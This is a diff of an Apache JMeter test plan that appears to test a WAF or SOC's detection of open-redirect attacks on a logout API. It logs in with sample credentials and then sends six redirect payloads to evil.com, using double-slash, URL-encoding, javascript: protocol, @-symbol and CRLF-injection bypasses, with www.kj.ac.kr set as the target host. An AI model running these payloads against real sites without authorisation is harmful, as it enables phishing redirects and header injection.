@@ -1,102 +1,389 @@
-<!-- Open Redirect 1: 외부 도메인 리다이렉트 -->
-<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_external" enabled="true">
-  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
-  <stringProp name="HTTPSampler.port">80</stringProp>
-  <stringProp name="HTTPSampler.protocol">http</stringProp>
-  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
-  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>  <!-- 리다이렉트 추적 안함 -->
-  <stringProp name="HTTPSampler.method">GET</stringProp>
-  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
-    <collectionProp name="Arguments.arguments">
-      <elementProp name="redirect" elementType="HTTPArgument">
-        <stringProp name="Argument.value">http://evil.com/phishing</stringProp>
-        <stringProp name="Argument.name">redirect</stringProp>
+<?xml version="1.0" encoding="UTF-8"?>
+<jmeterTestPlan version="1.2" properties="5.0" jmeter="5.6.3">
+  <hashTree>
+    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="ATTACK_OPEN_REDIRECT">
+      <stringProp name="TestPlan.comments">Open Redirect attacks on logout API (POST method with query params)</stringProp>
+      <elementProp name="TestPlan.user_defined_variables" elementType="Arguments" guiclass="ArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
+        <collectionProp name="Arguments.arguments">
+          <elementProp name="waf_host" elementType="Argument">
+            <stringProp name="Argument.name">waf_host</stringProp>
+            <stringProp name="Argument.value">www.kj.ac.kr</stringProp>
+            <stringProp name="Argument.metadata">=</stringProp>
+          </elementProp>
+          <elementProp name="waf_port" elementType="Argument">
+            <stringProp name="Argument.name">waf_port</stringProp>
+            <stringProp name="Argument.value">80</stringProp>
+            <stringProp name="Argument.metadata">=</stringProp>
+          </elementProp>
+          <elementProp name="waf_protocol" elementType="Argument">
+            <stringProp name="Argument.name">waf_protocol</stringProp>
+            <stringProp name="Argument.value">http</stringProp>
+            <stringProp name="Argument.metadata">=</stringProp>
+          </elementProp>
+          <elementProp name="login_email" elementType="Argument">
+            <stringProp name="Argument.name">login_email</stringProp>
+            <stringProp name="Argument.value">student1@campus.local</stringProp>
+            <stringProp name="Argument.metadata">=</stringProp>
+          </elementProp>
+          <elementProp name="login_password" elementType="Argument">
+            <stringProp name="Argument.name">login_password</stringProp>
+            <stringProp name="Argument.value">Password123!</stringProp>
+            <stringProp name="Argument.metadata">=</stringProp>
+          </elementProp>
+        </collectionProp>
       </elementProp>
-      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
-        <stringProp name="Argument.value">true</stringProp>
-        <stringProp name="Argument.name">X-SOC-Test</stringProp>
-      </elementProp>
-    </collectionProp>
-  </elementProp>
-  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
-</HTTPSamplerProxy>
-<hashTree>
-  <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="HTTP HeaderManager" enabled="true">
-    <collectionProp name="HeaderManager.headers">
-      <elementProp name="Authorization" elementType="Header">
-        <stringProp name="Header.name">Authorization</stringProp>
-        <stringProp name="Header.value">Bearer ${access_token}</stringProp>
-      </elementProp>
-    </collectionProp>
-  </HeaderManager>
-  <hashTree/>
-</hashTree>
+      <boolProp name="TestPlan.functional_mode">false</boolProp>
+      <boolProp name="TestPlan.serialize_threadgroups">false</boolProp>
+    </TestPlan>
+    <hashTree>
+      <ResultCollector guiclass="ViewResultsFullVisualizer" testclass="ResultCollector" testname="View Results Tree">
+        <boolProp name="ResultCollector.error_logging">false</boolProp>
+        <objProp>
+          <name>saveConfig</name>
+          <value class="SampleSaveConfiguration">
+            <time>true</time>
+            <latency>true</latency>
+            <timestamp>true</timestamp>
+            <success>true</success>
+            <label>true</label>
+            <code>true</code>
+            <message>true</message>
+            <threadName>true</threadName>
+            <dataType>true</dataType>
+            <encoding>false</encoding>
+            <assertions>true</assertions>
+            <subresults>true</subresults>
+            <responseData>false</responseData>
+            <samplerData>false</samplerData>
+            <xml>false</xml>
+            <fieldNames>true</fieldNames>
+            <responseHeaders>false</responseHeaders>
+            <requestHeaders>false</requestHeaders>
+            <responseDataOnError>false</responseDataOnError>
+            <saveAssertionResultsFailureMessage>true</saveAssertionResultsFailureMessage>
+            <assertionsResultsToSave>0</assertionsResultsToSave>
+            <bytes>true</bytes>
+            <sentBytes>true</sentBytes>
+            <url>true</url>
+            <threadCounts>true</threadCounts>
+            <idleTime>true</idleTime>
+            <connectTime>true</connectTime>
+          </value>
+        </objProp>
+        <stringProp name="filename"></stringProp>
+      </ResultCollector>
+      <hashTree/>
+      
+      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="ATTACK_OPEN_REDIRECT-ThreadGroup">
+        <intProp name="ThreadGroup.num_threads">1</intProp>
+        <intProp name="ThreadGroup.ramp_time">1</intProp>
+        <stringProp name="ThreadGroup.duration">${__P(duration,600)}</stringProp>
+        <longProp name="ThreadGroup.delay">5</longProp>
+        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
+        <boolProp name="ThreadGroup.scheduler">true</boolProp>
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController">
+          <stringProp name="LoopController.loops">1</stringProp>
+          <boolProp name="LoopController.continue_forever">false</boolProp>
+        </elementProp>
+      </ThreadGroup>
+      <hashTree>
+        <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP CookieManager" enabled="true">
+          <collectionProp name="CookieManager.cookies"/>
+          <boolProp name="CookieManager.clearEachIteration">true</boolProp>
+          <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
+        </CookieManager>
+        <hashTree/>
 
-<!-- Open Redirect 2: 더블 슬래시 우회 -->
-<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_double_slash" enabled="true">
-  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
-  <stringProp name="HTTPSampler.port">80</stringProp>
-  <stringProp name="HTTPSampler.protocol">http</stringProp>
-  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
-  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
-  <stringProp name="HTTPSampler.method">GET</stringProp>
-  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
-    <collectionProp name="Arguments.arguments">
-      <elementProp name="redirect" elementType="HTTPArgument">
-        <stringProp name="Argument.value">//evil.com</stringProp>
-        <stringProp name="Argument.name">redirect</stringProp>
-      </elementProp>
-      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
-        <stringProp name="Argument.value">true</stringProp>
-        <stringProp name="Argument.name">X-SOC-Test</stringProp>
-      </elementProp>
-    </collectionProp>
-  </elementProp>
-  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
-</HTTPSamplerProxy>
+        <!-- OnceOnlyController: 로그인은 한 번만 실행 -->
+        <OnceOnlyController guiclass="OnceOnlyControllerGui" testclass="OnceOnlyController" testname="Once Only Controller - Login" enabled="true"/>
+        <hashTree>
+          <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="Login" enabled="true">
+            <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+            <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+            <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+            <stringProp name="HTTPSampler.path">/api/auth/login</stringProp>
+            <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+            <stringProp name="HTTPSampler.method">POST</stringProp>
+            <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+            <boolProp name="HTTPSampler.postBodyRaw">true</boolProp>
+            <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+              <collectionProp name="Arguments.arguments">
+                <elementProp name="" elementType="HTTPArgument">
+                  <boolProp name="HTTPArgument.always_encode">false</boolProp>
+                  <stringProp name="Argument.value">{"email":"${login_email}","password":"${login_password}"}</stringProp>
+                  <stringProp name="Argument.metadata">=</stringProp>
+                </elementProp>
+              </collectionProp>
+            </elementProp>
+            <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+          </HTTPSamplerProxy>
+          <hashTree>
+            <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Login Headers" enabled="true">
+              <collectionProp name="HeaderManager.headers">
+                <elementProp name="Accept" elementType="Header">
+                  <stringProp name="Header.name">Accept</stringProp>
+                  <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+                </elementProp>
+                <elementProp name="Content-Type" elementType="Header">
+                  <stringProp name="Header.name">Content-Type</stringProp>
+                  <stringProp name="Header.value">application/json</stringProp>
+                </elementProp>
+              </collectionProp>
+            </HeaderManager>
+            <hashTree/>
+            <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract access_token" enabled="true">
+              <stringProp name="JSONPostProcessor.referenceNames">access_token</stringProp>
+              <stringProp name="JSONPostProcessor.jsonPathExprs">$.accessToken</stringProp>
+              <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
+              <stringProp name="JSONPostProcessor.defaultValues">NOT_FOUND</stringProp>
+            </JSONPostProcessor>
+            <hashTree/>
+          </hashTree>
+        </hashTree>
 
-<!-- Open Redirect 3: URL 인코딩 우회 -->
-<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_url_encoded" enabled="true">
-  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
-  <stringProp name="HTTPSampler.port">80</stringProp>
-  <stringProp name="HTTPSampler.protocol">http</stringProp>
-  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
-  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
-  <stringProp name="HTTPSampler.method">GET</stringProp>
-  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
-    <collectionProp name="Arguments.arguments">
-      <elementProp name="redirect" elementType="HTTPArgument">
-        <stringProp name="Argument.value">https%3A%2F%2Fevil.com%2F</stringProp>
-        <stringProp name="Argument.name">redirect</stringProp>
-      </elementProp>
-      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
-        <stringProp name="Argument.value">true</stringProp>
-        <stringProp name="Argument.name">X-SOC-Test</stringProp>
-      </elementProp>
-    </collectionProp>
-  </elementProp>
-  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
-</HTTPSamplerProxy>
+        <!-- ==================== Open Redirect 공격들 (POST Method로 수정) ==================== -->
 
-<!-- Open Redirect 4: 자바스크립트 프로토콜 (XSS 연계) -->
-<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_javascript" enabled="true">
-  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
-  <stringProp name="HTTPSampler.port">80</stringProp>
-  <stringProp name="HTTPSampler.protocol">http</stringProp>
-  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
-  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
-  <stringProp name="HTTPSampler.method">GET</stringProp>
-  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
-    <collectionProp name="Arguments.arguments">
-      <elementProp name="redirect" elementType="HTTPArgument">
-        <stringProp name="Argument.value">javascript:alert('SOC_OPEN_REDIRECT_XSS')</stringProp>
-        <stringProp name="Argument.name">redirect</stringProp>
-      </elementProp>
-      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
-        <stringProp name="Argument.value">true</stringProp>
-        <stringProp name="Argument.name">X-SOC-Test</stringProp>
-      </elementProp>
-    </collectionProp>
-  </elementProp>
-  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
-</HTTPSamplerProxy>
+        <!-- Open Redirect 1: 외부 도메인 리다이렉트 -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="[ATTACK] Open Redirect - External Domain" enabled="true">
+          <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+          <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+          <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+          <stringProp name="HTTPSampler.path">/api/auth/logout?redirect=http://evil.com/phishing</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+          <stringProp name="HTTPSampler.method">POST</stringProp>  <!-- GET → POST -->
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+            <collectionProp name="Arguments.arguments"/>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Auth Headers" enabled="true">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Accept" elementType="Header">
+                <stringProp name="Header.name">Accept</stringProp>
+                <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+              </elementProp>
+              <elementProp name="Authorization" elementType="Header">
+                <stringProp name="Header.name">Authorization</stringProp>
+                <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+              </elementProp>
+              <elementProp name="X-SOC-Test" elementType="Header">
+                <stringProp name="Header.name">X-SOC-Test</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+
+        <!-- Open Redirect 2: 더블 슬래시 우회 -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="[ATTACK] Open Redirect - Double Slash" enabled="true">
+          <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+          <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+          <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+          <stringProp name="HTTPSampler.path">/api/auth/logout?redirect=//evil.com</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+          <stringProp name="HTTPSampler.method">POST</stringProp>
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+            <collectionProp name="Arguments.arguments"/>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Auth Headers" enabled="true">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Accept" elementType="Header">
+                <stringProp name="Header.name">Accept</stringProp>
+                <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+              </elementProp>
+              <elementProp name="Authorization" elementType="Header">
+                <stringProp name="Header.name">Authorization</stringProp>
+                <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+              </elementProp>
+              <elementProp name="X-SOC-Test" elementType="Header">
+                <stringProp name="Header.name">X-SOC-Test</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+
+        <!-- Open Redirect 3: URL 인코딩 우회 -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="[ATTACK] Open Redirect - URL Encoded" enabled="true">
+          <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+          <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+          <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+          <stringProp name="HTTPSampler.path">/api/auth/logout?redirect=https%3A%2F%2Fevil.com%2F</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+          <stringProp name="HTTPSampler.method">POST</stringProp>
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+            <collectionProp name="Arguments.arguments"/>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Auth Headers" enabled="true">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Accept" elementType="Header">
+                <stringProp name="Header.name">Accept</stringProp>
+                <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+              </elementProp>
+              <elementProp name="Authorization" elementType="Header">
+                <stringProp name="Header.name">Authorization</stringProp>
+                <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+              </elementProp>
+              <elementProp name="X-SOC-Test" elementType="Header">
+                <stringProp name="Header.name">X-SOC-Test</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+
+        <!-- Open Redirect 4: 자바스크립트 프로토콜 (XSS 연계) -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="[ATTACK] Open Redirect - Javascript Protocol" enabled="true">
+          <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+          <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+          <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+          <stringProp name="HTTPSampler.path">/api/auth/logout?redirect=javascript:alert('SOC_OPEN_REDIRECT_XSS')</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+          <stringProp name="HTTPSampler.method">POST</stringProp>
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+            <collectionProp name="Arguments.arguments"/>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Auth Headers" enabled="true">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Accept" elementType="Header">
+                <stringProp name="Header.name">Accept</stringProp>
+                <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+              </elementProp>
+              <elementProp name="Authorization" elementType="Header">
+                <stringProp name="Header.name">Authorization</stringProp>
+                <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+              </elementProp>
+              <elementProp name="X-SOC-Test" elementType="Header">
+                <stringProp name="Header.name">X-SOC-Test</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+
+        <!-- Open Redirect 5: @ 문자를 이용한 우회 -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="[ATTACK] Open Redirect - At Symbol Bypass" enabled="true">
+          <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+          <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+          <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+          <stringProp name="HTTPSampler.path">/api/auth/logout?redirect=https://www.kj.ac.kr@evil.com</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+          <stringProp name="HTTPSampler.method">POST</stringProp>
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+            <collectionProp name="Arguments.arguments"/>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Auth Headers" enabled="true">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Accept" elementType="Header">
+                <stringProp name="Header.name">Accept</stringProp>
+                <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+              </elementProp>
+              <elementProp name="Authorization" elementType="Header">
+                <stringProp name="Header.name">Authorization</stringProp>
+                <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+              </elementProp>
+              <elementProp name="X-SOC-Test" elementType="Header">
+                <stringProp name="Header.name">X-SOC-Test</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+
+        <!-- Open Redirect 6: CRLF 인젝션 -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="[ATTACK] Open Redirect - CRLF Injection" enabled="true">
+          <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+          <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+          <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+          <stringProp name="HTTPSampler.path">/api/auth/logout?redirect=/dashboard%0d%0aLocation:%20http://evil.com</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+          <stringProp name="HTTPSampler.method">POST</stringProp>
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+            <collectionProp name="Arguments.arguments"/>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Auth Headers" enabled="true">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Accept" elementType="Header">
+                <stringProp name="Header.name">Accept</stringProp>
+                <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+              </elementProp>
+              <elementProp name="Authorization" elementType="Header">
+                <stringProp name="Header.name">Authorization</stringProp>
+                <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+              </elementProp>
+              <elementProp name="X-SOC-Test" elementType="Header">
+                <stringProp name="Header.name">X-SOC-Test</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+
+        <!-- 정상 로그아웃 (베이스라인) -->
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="[BASELINE] Normal Logout" enabled="true">
+          <stringProp name="HTTPSampler.domain">${waf_host}</stringProp>
+          <stringProp name="HTTPSampler.port">${waf_port}</stringProp>
+          <stringProp name="HTTPSampler.protocol">${waf_protocol}</stringProp>
+          <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
+          <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+          <stringProp name="HTTPSampler.method">POST</stringProp>
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments">
+            <collectionProp name="Arguments.arguments"/>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="Normal Headers" enabled="true">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Accept" elementType="Header">
+                <stringProp name="Header.name">Accept</stringProp>
+                <stringProp name="Header.value">application/json, text/plain, */*</stringProp>
+              </elementProp>
+              <elementProp name="Authorization" elementType="Header">
+                <stringProp name="Header.name">Authorization</stringProp>
+                <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+              </elementProp>
+              <elementProp name="X-SOC-Test" elementType="Header">
+                <stringProp name="Header.name">X-SOC-Test</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+      </hashTree>
+    </hashTree>
+  </hashTree>
+</jmeterTestPlan> 
